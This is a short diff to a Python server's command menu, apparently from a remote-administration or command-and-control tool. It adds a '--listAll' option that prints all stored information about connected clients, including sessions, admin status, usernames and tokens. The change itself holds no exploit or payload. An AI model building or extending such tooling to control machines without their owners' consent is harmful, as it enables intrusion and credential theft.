@@ -14,6 +14,7 @@ from .management import Management
 from .management import CheckConn
 from .other import printColor
 from .other import printAllTarget
+from .other import printAllTargetAllInformation
 from .sql import Sql
 from .broadcast import Broadcast
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
@@ -34,6 +35,8 @@ class Menu:
  -h or --help : Displays all server commands.
 
  -ls or --list : Displays all clients with their information.
+
+ --listAll : displays all client information.
 
  -t session_id  or --target session_id : Selects a session (client) to be able to execute commands (mod session). 
 
@@ -125,6 +128,9 @@ class Menu:
                         
                 elif(choice[i] == "-ls" or choice[i] == "--list"):
                     printAllTarget()
+
+                elif(choice[i] == "--listAll"):
+                    printAllTargetAllInformation()
                 
                 elif(choice[i]== "--connectionDisplayDisable" or choice[i] == "-cdd"):
                     self.changeStatusDisplay(False)
